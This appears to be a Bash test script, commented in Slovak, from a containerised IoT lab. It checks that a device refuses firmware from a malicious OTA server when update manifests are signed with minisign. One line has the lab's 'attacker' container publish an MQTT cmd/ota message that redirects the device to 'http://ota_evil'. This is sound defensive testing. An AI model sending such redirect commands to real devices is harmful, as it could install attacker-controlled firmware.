#!/usr/bin/env bash
# OTA Secure útok – attacker presmeruje DUT na evil OTA server
# Očakávaný výsledok: NEUSPECH (podpis evil manifestu neplatí)
# Spustiť po: docker compose -f docker-compose.yml -f docker-compose.ota-secure.yml up -d
# Požiadavka: MINISIGN_PUBKEY v .env musí byť nastavený!
set -euo pipefail
cd "$(dirname "$0")/.."

echo "=== OTA SECURE ATTACK ==="
echo ""

# Kontrola MINISIGN_PUBKEY
MINISIGN_PUBKEY=$(grep MINISIGN_PUBKEY .env | cut -d= -f2-)
if [ -z "$MINISIGN_PUBKEY" ]; then
    echo "CHYBA: MINISIGN_PUBKEY nie je nastavený v .env!"
    echo "Postup:"
    echo "  1. minisign -G -p configs/ota/minisign.pub -s configs/ota/minisign.key"
    echo "  2. minisign -S -s configs/ota/minisign.key -m configs/ota/repo/manifest.json"
    echo "  3. Do .env pridaj: MINISIGN_PUBKEY=<obsah riadku 2 z minisign.pub>"
    exit 1
fi

echo "[1] Attacker posiela cmd/ota s URL evil servera..."
docker compose exec -T attacker \
  mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil" -d
echo ""
echo "[2] Čakám 8 s na DUT reakciu..."
sleep 8
echo ""
echo "[3] Kontrolujem DUT log (hľadám 'ZAMIETNUTÁ')..."
RUN_ID=$(grep RUN_ID .env | cut -d= -f2)
grep -i "zamietnutá\|podpis\|OTA" "runs/${RUN_ID}/logs/dut.log" | tail -10 || echo "(zatial nic)"
echo ""
echo "=== VYSLEDOK: DUT mal ODMIETNUŤ evil firmware (ZAMIETNUTÁ v logu) ==="
